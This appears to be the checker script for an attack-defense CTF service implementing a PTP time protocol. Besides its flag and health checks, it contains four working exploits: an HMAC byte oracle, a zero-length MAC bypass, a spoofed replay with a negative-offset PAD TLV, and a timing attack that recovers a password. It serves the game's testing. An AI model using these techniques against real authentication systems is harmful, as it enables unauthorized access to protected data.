import asyncio
import typing
import traceback
import contextlib
import random
import string
import faker
import secrets
import hmac
import hashlib
import struct
import numpy as np

from logging import LoggerAdapter

from enochecker3 import (
    ChainDB,
    Enochecker,
    ExploitCheckerTaskMessage,
    FlagSearcher,
    BaseCheckerTaskMessage,
    PutflagCheckerTaskMessage,
    GetflagCheckerTaskMessage,
    PutnoiseCheckerTaskMessage,
    GetnoiseCheckerTaskMessage,
    HavocCheckerTaskMessage,
    MumbleException,
    OfflineException,
    InternalErrorException,
    PutflagCheckerTaskMessage,
    AsyncSocket,
)
from enochecker3.utils import assert_equals, assert_in

import ptp_protocol
import ptp_message

"""
Checker config
"""

LOCAL_PORT = 2000
EVENT_PORT = 319
GENERAL_PORT = 320
HTTP_PORT = 1588
checker = Enochecker("syncryn1z3", HTTP_PORT)
app = lambda: checker.app


"""
Dependencies
"""


class UdpClientProtocol(asyncio.DatagramProtocol):
    def __init__(self):
        self.transport = None
        self.queue = asyncio.Queue()

        self.on_con_lost = asyncio.get_event_loop().create_future()

    def connection_made(self, transport):
        self.transport = transport

    def connection_lost(self, exc):
        if not self.on_con_lost.done():
            self.on_con_lost.set_result(True)

    def datagram_received(self, data, address):
        self.queue.put_nowait(data)

class Connection:
    BUFFER_SIZE = 1472

    def __init__(self, remote_address, protocol: UdpClientProtocol, logger: LoggerAdapter):
        self.remote_address = remote_address
        self.protocol = protocol
        self.logger = logger

    def send_raw(self, request, port):
        self.protocol.transport.sendto(request, (self.remote_address, port))
        
    async def receive_raw(self, port):
        try:
            return await asyncio.wait_for(self.protocol.queue.get(), 1.0)
        except asyncio.TimeoutError:
            raise OfflineException("Timeout waiting for response")

    def send(self, message, port):
        request = message.encode(self.BUFFER_SIZE)
        self.send_raw(request, port)

    async def receive(self, port):
        response = await self.receive_raw(port)
        message = ptp_message.from_buffer(response)

        return message

@checker.register_dependency
@contextlib.asynccontextmanager
async def _get_async_udp_protocol(logger: LoggerAdapter) -> typing.AsyncIterator[UdpClientProtocol]:
    try:
        transport, protocol = await asyncio.get_running_loop().create_datagram_endpoint(lambda: UdpClientProtocol(), local_addr=("0.0.0.0", 0))
    except Exception as e:
        logger.info(f"Failed to create UDP endpoint {e}")
        raise InternalErrorException("Could not create UDP socket")

    try:
        yield protocol
    finally:
        transport.close()
        await protocol.on_con_lost

@checker.register_dependency
def _get_connection(task: BaseCheckerTaskMessage, protocol: typing.AsyncIterator[UdpClientProtocol], logger: LoggerAdapter) -> Connection:
    return Connection(task.address, protocol, logger)


"""
Utility functions
"""

def generate_port_id():
    clock_id = random.randint(0x0200000000000001, 0x02ffffffffffffff)
    port = random.randint(0x1, 0xfffe)

    return clock_id, port

def generate_secret(length: int):
    return (''.join(secrets.choice(string.printable) for _ in range(length)))

def generate_timestamp():
    return random.randint(0x0, 0xffffffffffffffff)

def encode_port_id(clock_id: int, port: int):
    return hex(clock_id) + ":" + hex(port)

def decode_port_id(port_id: str):
    parts = port_id.split(":")
    
    return int(parts[0], 16), int(parts[1], 16)

def policy_to_int(policy: str):
    if policy == "hmac":
        return ptp_protocol.lib.PTP_AUTHENTICATION_POLICY_HMAC_128
    elif policy == "plain":
        return ptp_protocol.lib.PTP_AUTHENTICATION_POLICY_PLAIN
    else:
        raise InternalErrorException(f"Unknown policy {policy}")

def add_auth_tlv(message, policy: str, icv_length=None):
    tlv = message.add_tlv(ptp_protocol.lib.PTP_TLV_TYPE_AUTHENTICATION)
    tlv.payload.authentication.policy = policy_to_int(policy)
    tlv.payload.authentication.parameter_indicator = 0
    tlv.payload.authentication.key_id = 0

    if icv_length is not None:
        tlv.payload.authentication.icv_length = icv_length
    elif policy == "hmac":
        tlv.payload.authentication.icv_length = 16
    elif policy == "plain":
        tlv.payload.authentication.icv_length = 100
    else:
        raise InternalErrorException(f"Unknown policy {policy}")
    
def finalize_auth_tlv(tlv, request, secret=b"", icv=None):
    if tlv.type != ptp_protocol.lib.PTP_TLV_TYPE_AUTHENTICATION:
        return

    buffer_address = ptp_protocol.ffi.cast("uint8_t *", ptp_protocol.ffi.addressof(ptp_protocol.ffi.from_buffer(request)))
    icv_address = tlv.payload.authentication.icv
    
    if tlv.payload.authentication.policy == policy_to_int("hmac"):
        if icv is None:
            icv = hmac.new(secret + b'\x00' * (100 - len(secret)), bytearray(request)[:icv_address - buffer_address], hashlib.sha256).digest()
    elif tlv.payload.authentication.policy == policy_to_int("plain"):
        icv = secret + b'\0'
    else:
        raise InternalErrorException(f"Unknown policy in finalize")

    ptp_protocol.ffi.memmove(icv_address, icv[:tlv.payload.authentication.icv_length], tlv.payload.authentication.icv_length)

def finalize_auth_tlvs(request, secret=b"", icv=None):
    message = ptp_message.from_buffer(request)

    for tlv in message.get_tlvs():
        finalize_auth_tlv(tlv, request, secret, icv)

async def claim_port(connection: Connection, logger: LoggerAdapter, clock_id: int, port: int, secret: bytes, policy: str, description: bytes, expect_error=False):
    if (len(secret) > 100):
        raise InternalErrorException("Secret too large")

    if (len(description) > 128):
        raise InternalErrorException("User description too large")
    
    local_clock_id, local_port = generate_port_id()
    message = ptp_message.from_parameters(ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT, local_clock_id, local_port, 0)

    payload = message.get_payload()
    payload.management.target_port_id.clock_id = clock_id
    payload.management.target_port_id.port = port
    payload.management.action = ptp_protocol.lib.PTP_MANAGEMENT_ACTION_COMMAND
    payload.management.starting_boundary_hops = 0
    payload.management.boundary_hops = 0

    tlv = message.add_tlv(ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT)
    tlv.payload.management.id = ptp_protocol.lib.PTP_MANAGEMENT_ID_IMPLEMENTATION_SPECIFIC_PORT_CLAIM
    tlv.payload.management.payload.port_claim.authentication_policy = policy_to_int(policy)
    ptp_protocol.ffi.memmove(tlv.payload.management.payload.port_claim.port_secret, secret + b'\0', len(secret) + 1)
    ptp_protocol.ffi.memmove(tlv.payload.management.payload.port_claim.user_description, description + b'\0', len(description) + 1)

    connection.send(message, GENERAL_PORT)
    response = await connection.receive(GENERAL_PORT)

    if response.decoded.type != ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT:
        raise MumbleException("Expected management message in response")
    
    if response.decoded.payload.management.action != ptp_protocol.lib.PTP_MANAGEMENT_ACTION_ACKNOWLEDGE and not expect_error:
        raise MumbleException("Expected management acknowledge action")

    received_description = None

    for tlv in response.get_tlvs():
        if tlv.type == ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT:
            if tlv.payload.management.id == ptp_protocol.lib.PTP_MANAGEMENT_ID_IMPLEMENTATION_SPECIFIC_PORT_CLAIM:
                received_description = ptp_protocol.ffi.string(tlv.payload.management.payload.port_claim.user_description)
        if tlv.type == ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT_ERROR_STATUS:
            if expect_error:
                return ptp_protocol.ffi.string(tlv.payload.management_error_status.display_data).decode()
            else:
                logger.debug(f"Unexpected management error (claim_port): {ptp_protocol.ffi.string(tlv.payload.management_error_status.display_data).decode()}")
                raise MumbleException("Unexpected management error in PORT_CLAIM response")

    if received_description is None:
        raise MumbleException("Received no PORT_CLAIM TLV")
    
    assert_equals(received_description, description, "Received wrong user description in PORT_CLAIM response")
    
    if expect_error:
        raise MumbleException("Expected management error in PORT_CLAIM response")

async def get_user_description(connection: Connection, logger: LoggerAdapter, clock_id: int, port: int, secret: bytes, policy: str, expect_error=False):
    local_clock_id, local_port = generate_port_id()
    message = ptp_message.from_parameters(ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT, local_clock_id, local_port, 0)

    payload = message.get_payload()
    payload.management.target_port_id.clock_id = clock_id
    payload.management.target_port_id.port = port
    payload.management.action = ptp_protocol.lib.PTP_MANAGEMENT_ACTION_GET

    tlv = message.add_tlv(ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT)
    tlv.payload.management.id = ptp_protocol.lib.PTP_MANAGEMENT_ID_USER_DESCRIPTION

    add_auth_tlv(message, policy)
    request = message.encode(connection.BUFFER_SIZE)
    finalize_auth_tlvs(request, secret=secret)

    connection.send_raw(request, GENERAL_PORT)
    response = await connection.receive(GENERAL_PORT)

    if response.decoded.type != ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT:
        raise MumbleException("Expected management message in response")
    
    if response.decoded.payload.management.action != ptp_protocol.lib.PTP_MANAGEMENT_ACTION_RESPONSE and not expect_error:
        raise MumbleException("Expected management response action")

    received_description = None

    for tlv in response.get_tlvs():
        if tlv.type == ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT:
            if tlv.payload.management.id == ptp_protocol.lib.PTP_MANAGEMENT_ID_USER_DESCRIPTION:
                received_description = ptp_protocol.ffi.string(tlv.payload.management.payload.user_description)
        if tlv.type == ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT_ERROR_STATUS:
            if expect_error:
                return ptp_protocol.ffi.string(tlv.payload.management_error_status.display_data).decode()
            else:
                logger.debug(f"Unexpected management error (get user description): {ptp_protocol.ffi.string(tlv.payload.management_error_status.display_data).decode()}")
                raise MumbleException("Unexpected management error in USER_DESCRIPTION response")

    if expect_error:
        raise MumbleException("Expected management error in USER_DESCRIPTION response")
    
    return received_description.decode()
    
async def get_time(connection: Connection, logger: LoggerAdapter, clock_id: int, port: int, expect_error=False):
    local_clock_id, local_port = generate_port_id()
    message = ptp_message.from_parameters(ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT, local_clock_id, local_port, 0)

    payload = message.get_payload()
    payload.management.target_port_id.clock_id = clock_id
    payload.management.target_port_id.port = port
    payload.management.action = ptp_protocol.lib.PTP_MANAGEMENT_ACTION_GET

    tlv = message.add_tlv(ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT)
    tlv.payload.management.id = ptp_protocol.lib.PTP_MANAGEMENT_ID_TIME

    connection.send(message, GENERAL_PORT)
    response = await connection.receive(GENERAL_PORT)

    if response.decoded.type != ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT:
        raise MumbleException("Expected management message in response")
    
    if response.decoded.payload.management.action != ptp_protocol.lib.PTP_MANAGEMENT_ACTION_RESPONSE and not expect_error:
        raise MumbleException("Expected management response action")

    current_time = None

    for tlv in response.get_tlvs():
        if tlv.type == ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT:
            if tlv.payload.management.id == ptp_protocol.lib.PTP_MANAGEMENT_ID_TIME:
                current_time = tlv.payload.management.payload.time
        if tlv.type == ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT_ERROR_STATUS:
            if expect_error:
                return ptp_protocol.ffi.string(tlv.payload.management_error_status.display_data).decode()
            else:
                logger.debug(f"Unexpected management error (get time): {ptp_protocol.ffi.string(tlv.payload.management_error_status.display_data).decode()}")
                raise MumbleException("Unexpected management error in TIME response")

    if current_time is None:
        raise MumbleException("Received no TIME TLV")

    if expect_error:
        raise MumbleException("Expected management error in USER_DESCRIPTION response")
    
    return current_time

async def request_unicast_message(connection: Connection, logger: LoggerAdapter, clock_id: int, port: int, secret: bytes, policy: str, type: int):
    local_clock_id, local_port = generate_port_id()
    message = ptp_message.from_parameters(ptp_protocol.lib.PTP_MESSAGE_TYPE_SIGNALING, local_clock_id, local_port, 0)

    payload = message.get_payload()
    payload.signaling.target_port_id.clock_id = clock_id
    payload.signaling.target_port_id.port = port

    tlv = message.add_tlv(ptp_protocol.lib.PTP_TLV_TYPE_REQUEST_UNICAST_TRANSMISSION)
    tlv.payload.request_unicast.type = type
    tlv.payload.request_unicast.log_message_interval = 0
    tlv.payload.request_unicast.duration = 0

    add_auth_tlv(message, policy)
    request = message.encode(connection.BUFFER_SIZE)
    finalize_auth_tlvs(request, secret=secret)

    connection.send_raw(request, EVENT_PORT)
    response = await connection.receive(EVENT_PORT)

    for tlv in response.get_tlvs():
        if tlv.type == ptp_protocol.lib.PTP_TLV_TYPE_GRANT_UNICAST_TRANSMISSION:
            return
        if tlv.type == ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT_ERROR_STATUS:
            raise MumbleException(f"Received error from server: {ptp_protocol.ffi.string(tlv.payload.management_error_status.display_data).decode()}")

    raise MumbleException("Received no unicast transmission grant")

async def run_synchronization(connection: Connection, logger: LoggerAdapter, clock_id: int, port: int, secret: bytes, policy: str):
    await request_unicast_message(connection, logger, clock_id, port, secret, policy, ptp_protocol.lib.PTP_MESSAGE_TYPE_SYNC)

    sync = await connection.receive(EVENT_PORT)

    if sync.decoded.type != ptp_protocol.lib.PTP_MESSAGE_TYPE_SYNC:
        raise MumbleException("Expected sync message")
    
    t1 = sync.decoded.payload.event.timestamp

    local_clock_id, local_port = generate_port_id()
    delay_request = ptp_message.from_parameters(ptp_protocol.lib.PTP_MESSAGE_TYPE_DELAY_REQUEST, local_clock_id, local_port, 0)

    payload = delay_request.get_payload()
    payload.event.timestamp = generate_timestamp()

    connection.send(delay_request, EVENT_PORT)
    delay_response = await connection.receive(EVENT_PORT)

    if delay_response.decoded.type != ptp_protocol.lib.PTP_MESSAGE_TYPE_DELAY_RESPONSE:
        raise MumbleException("Expected delay response message")
    
    t4 = delay_response.decoded.payload.event.timestamp

    if (t1 >= t4):
        raise MumbleException("Timejump during synchronization process")

"""
CHECKER FUNCTIONS
"""

@checker.putflag(0)
async def putflag_user_description_hmac(
    task: PutflagCheckerTaskMessage,
    db: ChainDB,
    connection: Connection,
    logger: LoggerAdapter,    
) -> None:
    clock_id, port = generate_port_id()
    secret = generate_secret(50)

    await claim_port(connection, logger, clock_id, port, secret.encode("ascii"), "hmac", task.flag.encode("utf-8"))

    await db.set("userdata", (clock_id, port, secret))

    return encode_port_id(clock_id, port)

@checker.putflag(1)
async def putflag_user_description_plain(
    task: PutflagCheckerTaskMessage,
    db: ChainDB,
    connection: Connection,
    logger: LoggerAdapter,    
) -> None:
    clock_id, port = generate_port_id()
    secret = generate_secret(8)

    await claim_port(connection, logger, clock_id, port, secret.encode("ascii"), "plain", task.flag.encode("utf-8"))

    await db.set("userdata", (clock_id, port, secret))

    return encode_port_id(clock_id, port)

@checker.getflag(0)
async def getflag_user_description_hmac(
    task: GetflagCheckerTaskMessage,
    db: ChainDB,
    connection: Connection,
    logger: LoggerAdapter,    
) -> None:
    try:
        clock_id, port, secret = await db.get("userdata")
    except KeyError:
        raise MumbleException("Missing database entry from putflag")

    received_description = await get_user_description(connection, logger, clock_id, port, secret.encode("ascii"), "hmac")

    if received_description is None:
        raise MumbleException("Received no USER_DESCRIPTION TLV")
    
    assert_equals(received_description, task.flag, "Received wrong flag")

@checker.getflag(1)
async def getflag_user_description_plain(
    task: GetflagCheckerTaskMessage,
    db: ChainDB,
    connection: Connection,
    logger: LoggerAdapter,    
) -> None:
    try:
        clock_id, port, secret = await db.get("userdata")
    except KeyError:
        raise MumbleException("Missing database entry from putflag")

    received_description = await get_user_description(connection, logger, clock_id, port, secret.encode("ascii"), "plain")

    assert_equals(received_description, task.flag, "Received wrong flag")

@checker.putnoise(0)
async def putnoise_sync(
    task: PutnoiseCheckerTaskMessage,
    db: ChainDB,
    connection: Connection,
    logger: LoggerAdapter,    
) -> None:
    clock_id, port = generate_port_id()
    secret = generate_secret(50)

    await claim_port(connection, logger, clock_id, port, secret.encode("ascii"), "hmac", bytes())

    await db.set("userdata", (clock_id, port, secret))

@checker.putnoise(1)
async def putnoise_user_description_twice(
    task: PutnoiseCheckerTaskMessage,
    db: ChainDB,
    connection: Connection,
    logger: LoggerAdapter,    
) -> None:
    clock_id, port = generate_port_id()
    secret = generate_secret(50)
    description = generate_secret(50)

    await claim_port(connection, logger, clock_id, port, secret.encode("ascii"), "hmac", description.encode("utf-8"))
    error = await claim_port(connection, logger, clock_id, port, secret.encode("ascii"), "hmac", generate_secret(50).encode("utf-8"), True)

    assert_equals(error, "Port already claimed", "Wrong error message")

    await db.set("userdata", (clock_id, port, secret, description))

@checker.getnoise(0)
async def getnoise_sync(
    task: GetnoiseCheckerTaskMessage,
    db: ChainDB,
    connection: Connection,
    logger: LoggerAdapter,    
) -> None:
    try:
        clock_id, port, secret = await db.get("userdata")
    except KeyError:
        raise MumbleException("Missing database entry from putflag")

    await run_synchronization(connection, logger, clock_id, port, secret.encode("ascii"), "hmac")
    
@checker.getnoise(1)
async def getnoise_user_description_twice(
    task: GetnoiseCheckerTaskMessage,
    db: ChainDB,
    connection: Connection,
    logger: LoggerAdapter,    
) -> None:
    try:
        clock_id, port, secret, description = await db.get("userdata")
    except KeyError:
        raise MumbleException("Missing database entry from putflag")

    received_description = await get_user_description(connection, logger, clock_id, port, secret.encode("ascii"), "hmac")
    assert_equals(received_description, description, "Received wrong description")

@checker.havoc(0)
async def havoc_malformed_port_id(
    task: HavocCheckerTaskMessage,
    connection: Connection,
    logger: LoggerAdapter,    
) -> None:
    clock_id = 0xffffffffffffffff
    port = 0xffff
    secret = generate_secret(50)

    await get_user_description(connection, logger, clock_id, port, secret.encode("ascii"), "hmac", True)

@checker.havoc(1)
async def havoc_get_time(
    task: HavocCheckerTaskMessage,
    connection: Connection,
    logger: LoggerAdapter,    
) -> None:
    clock_id, port = generate_port_id()

    last_time = 0

    for _ in range(3):
        current_time = await get_time(connection, logger, clock_id, port)

        if current_time <= last_time:
            raise MumbleException("Timejump detected")
        
        last_time = current_time

@checker.havoc(2)
async def havoc_sync(
    task: HavocCheckerTaskMessage,
    connection: Connection,
    logger: LoggerAdapter,    
) -> None:
    clock_id, port = generate_port_id()

    last_time = 0

    for _ in range(3):
        current_time = await get_time(connection, logger, clock_id, port)

        if current_time <= last_time:
            raise MumbleException("Timejump detected")
        
        last_time = current_time

@checker.exploit(0)
async def exploit_memcmp(
    task: ExploitCheckerTaskMessage,
    connection: Connection,
    logger:LoggerAdapter
) -> typing.Optional[str]:
    if task.attack_info is None:
        raise MumbleException("No attack info")
    
    clock_id, port = decode_port_id(task.attack_info)
    local_clock_id, local_port = generate_port_id()

    message = ptp_message.from_parameters(ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT, local_clock_id, local_port, 0)

    payload = message.get_payload()
    payload.management.target_port_id.clock_id = clock_id
    payload.management.target_port_id.port = port
    payload.management.action = ptp_protocol.lib.PTP_MANAGEMENT_ACTION_GET
    payload.management.starting_boundary_hops = 0
    payload.management.boundary_hops = 0

    tlv = message.add_tlv(ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT)
    tlv.payload.management.id = ptp_protocol.lib.PTP_MANAGEMENT_ID_USER_DESCRIPTION

    add_auth_tlv(message, "hmac")
    request = message.encode(connection.BUFFER_SIZE)

    icv = bytearray(16)

    for i in range(len(icv)):
        async def guess_byte(icv):
            finalize_auth_tlvs(request, icv=icv)

            connection.send_raw(request, GENERAL_PORT)
            response = await connection.receive(GENERAL_PORT)

            if response.decoded.type != ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT:
                raise MumbleException("Expected management message")

            for tlv in response.get_tlvs():
                if tlv.type == ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT_ERROR_STATUS:
                    return tlv.payload.management_error_status.error_id - 0xc000
                elif tlv.type == ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT:
                    # Early return in case we guessed the ICV prematurely
                    logger.debug("Early return")
                    return 0
                
            raise MumbleException("No error status in response")

        guess_0 = await guess_byte(icv)
        icv[i] = 1
        guess_1 = await guess_byte(icv)

        # Check if we skipped a byte
        if guess_0 == guess_1 + 1 and guess_0 != 10:
            icv[i] = guess_0
        else:
            icv[i] = 10
            guess_10 = await guess_byte(icv)

            # Tiebraker
            if guess_0 == 1 and guess_10 == 9:
                icv[i] = 1
            elif guess_0 == 10 and guess_1 == 9:
                icv[i] = 10
            else:
                icv[i] = 0

    finalize_auth_tlvs(request, icv=icv)

    connection.send_raw(request, GENERAL_PORT)
    response = await connection.receive(GENERAL_PORT)

    if response.decoded.type != ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT:
        raise MumbleException("Expected management message in response")
    
    if response.decoded.payload.management.action != ptp_protocol.lib.PTP_MANAGEMENT_ACTION_RESPONSE:
        raise MumbleException("Expected management response action")
    
    for tlv in response.get_tlvs():
        if tlv.type == ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT:
            if tlv.payload.management.id == ptp_protocol.lib.PTP_MANAGEMENT_ID_USER_DESCRIPTION:
                received_flag = ptp_protocol.ffi.string(tlv.payload.management.payload.user_description).decode()
                logger.debug(f"Received flag {received_flag}")
                return received_flag


@checker.exploit(1)
async def exploit_zerolength(
    task: ExploitCheckerTaskMessage,
    connection: Connection,
    logger:LoggerAdapter
) -> typing.Optional[str]:
    if task.attack_info is None:
        raise MumbleException("No attack info")
    
    clock_id, port = decode_port_id(task.attack_info)
    local_clock_id, local_port = generate_port_id()

    message = ptp_message.from_parameters(ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT, local_clock_id, local_port, 0)

    payload = message.get_payload()
    payload.management.target_port_id.clock_id = clock_id
    payload.management.target_port_id.port = port
    payload.management.action = ptp_protocol.lib.PTP_MANAGEMENT_ACTION_GET
    payload.management.starting_boundary_hops = 0
    payload.management.boundary_hops = 0

    tlv = message.add_tlv(ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT)
    tlv.payload.management.id = ptp_protocol.lib.PTP_MANAGEMENT_ID_USER_DESCRIPTION

    add_auth_tlv(message, "hmac", 0)

    connection.send(message, GENERAL_PORT)
    response = await connection.receive(GENERAL_PORT)

    if response.decoded.type != ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT:
        raise MumbleException("Expected management message in response")
    
    if response.decoded.payload.management.action != ptp_protocol.lib.PTP_MANAGEMENT_ACTION_RESPONSE:
        raise MumbleException("Expected management response action")
    
    for tlv in response.get_tlvs():
        if tlv.type == ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT:
            if tlv.payload.management.id == ptp_protocol.lib.PTP_MANAGEMENT_ID_USER_DESCRIPTION:
                received_flag = ptp_protocol.ffi.string(tlv.payload.management.payload.user_description).decode()
                logger.debug(f"Received flag {received_flag}")
                return received_flag

@checker.exploit(2)
async def exploit_replay(
    task: ExploitCheckerTaskMessage,
    connection: Connection,
    logger:LoggerAdapter
) -> typing.Optional[str]:
    if task.attack_info is None:
        raise MumbleException("No attack info")
    
    clock_id, port = decode_port_id(task.attack_info)

    # Spoof target port
    initial_message = ptp_message.from_parameters(ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT, clock_id, port, 0)

    payload = initial_message.get_payload()
    payload.management.target_port_id.clock_id = clock_id
    payload.management.target_port_id.port = port
    payload.management.action = ptp_protocol.lib.PTP_MANAGEMENT_ACTION_RESPONSE
    payload.management.starting_boundary_hops = 0
    payload.management.boundary_hops = 0

    tlv = initial_message.add_tlv(ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT)
    tlv.payload.management.id = ptp_protocol.lib.PTP_MANAGEMENT_ID_USER_DESCRIPTION

    add_auth_tlv(initial_message, "hmac")

    connection.send(initial_message, GENERAL_PORT)
    response = await connection.receive_raw(GENERAL_PORT)

    altered_request = bytearray(response).rstrip(b'\0')[:-4]

    tlv_get_message = struct.pack("!HhHH", ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT, 4, ptp_protocol.lib.PTP_MANAGEMENT_ID_USER_DESCRIPTION, 0)
    tlv_pad_message = struct.pack("!Hh", ptp_protocol.lib.PTP_TLV_TYPE_PAD, -38) # Jump back to auth TLV
    altered_request += tlv_get_message + tlv_pad_message

    if (len(response) < len(altered_request)):
        raise MumbleException(f"Not enough TLV tailroom (got {len(response)} but expected at least {len(altered_request)} bytes)")
    
    altered_request += b'\0' * (len(response) - len(altered_request))

    connection.send_raw(altered_request, GENERAL_PORT)
    response = await connection.receive(GENERAL_PORT)

    if response.decoded.type != ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT:
        raise MumbleException("Expected management message in response")
    
    if response.decoded.payload.management.action != ptp_protocol.lib.PTP_MANAGEMENT_ACTION_RESPONSE:
        raise MumbleException("Expected management response action")
    
    for tlv in response.get_tlvs():
        if tlv.type == ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT:
            if tlv.payload.management.id == ptp_protocol.lib.PTP_MANAGEMENT_ID_USER_DESCRIPTION:
                received_flag = ptp_protocol.ffi.string(tlv.payload.management.payload.user_description).decode()
                logger.debug(f"Received flag {received_flag}")
                return received_flag

@checker.exploit(3)
async def exploit_timing(
    task: ExploitCheckerTaskMessage,
    connection: Connection,
    logger:LoggerAdapter
) -> typing.Optional[str]:
    if task.attack_info is None:
        raise MumbleException("No attack info")
    
    clock_id, port = decode_port_id(task.attack_info)
    local_clock_id, local_port = generate_port_id()

    message = ptp_message.from_parameters(ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT, local_clock_id, local_port, 0)

    payload = message.get_payload()
    payload.management.target_port_id.clock_id = clock_id
    payload.management.target_port_id.port = port
    payload.management.action = ptp_protocol.lib.PTP_MANAGEMENT_ACTION_GET
    payload.management.starting_boundary_hops = 0
    payload.management.boundary_hops = 0

    for _ in range(10):
        # Measure execution time (start time / end time of previous char)
        tlv = message.add_tlv(ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT)
        tlv.payload.management.id = ptp_protocol.lib.PTP_MANAGEMENT_ID_TIME

        # Trigger auth TLV
        tlv = message.add_tlv(ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT)
        tlv.payload.management.id = ptp_protocol.lib.PTP_MANAGEMENT_ID_USER_DESCRIPTION

        # Auth TLV to measure
        add_auth_tlv(message, "plain", 8)

    # End time of last char
    tlv = message.add_tlv(ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT)
    tlv.payload.management.id = ptp_protocol.lib.PTP_MANAGEMENT_ID_TIME
    
    request = message.encode(connection.BUFFER_SIZE)
    message = ptp_message.from_buffer(request)

    secret = bytearray()

    async def guess_char(secret):
        durations = np.empty(len(string.printable))
        i_request = 0
        i_response = 0

        while i_request < len(string.printable):
            j = 0

            for tlv in message.get_tlvs():
                if i_request >= len(string.printable):
                    break

                if tlv.type != ptp_protocol.lib.PTP_TLV_TYPE_AUTHENTICATION:
                    continue

                character = string.printable[i_request].encode("ascii")
                finalize_auth_tlv(tlv, request, secret + character)

                if j >= 1:
                    i_request += 1
                
                j += 1

            connection.send_raw(request, GENERAL_PORT)
            response = await connection.receive(GENERAL_PORT)

            if response.decoded.type != ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT:
                raise MumbleException("Expected management message")
            
            j = 0
            for tlv in response.get_tlvs():
                if tlv.type != ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT:
                    continue

                if tlv.payload.management.id == ptp_protocol.lib.PTP_MANAGEMENT_ID_USER_DESCRIPTION:
                    received_flag = ptp_protocol.ffi.string(tlv.payload.management.payload.user_description).decode()
                    return None, None, received_flag
                elif tlv.payload.management.id != ptp_protocol.lib.PTP_MANAGEMENT_ID_TIME:
                    continue

                # The first measurement is garbage (likely due to cache misses)
                if j >= 2:
                    durations[i_response] = tlv.payload.management.payload.time - last_time
                    i_response += 1

                if i_response >= len(string.printable):
                    break
                
                last_time = tlv.payload.management.payload.time
                j += 1

        guess = string.printable[np.argmax(durations)].encode("ascii")
        sqrt_duration = np.sqrt(np.sum(durations))

        return guess, sqrt_duration, None
    
    sqrt_durations = [0]

    for _ in range(50):
        guess, sqrt_duration, received_flag = await guess_char(bytes(secret))

        if received_flag is not None:
            logger.debug(f"Received flag {received_flag}")
            return received_flag
        
        # Backtracking if we made an error due to noise
        if np.abs(sqrt_duration - sqrt_durations[-1]) > 100:
            secret += guess
            sqrt_durations += [sqrt_duration]
        else:
            secret = secret[:-1]
            sqrt_durations = sqrt_durations[:-1]

if __name__ == "__main__":
    checker.run()
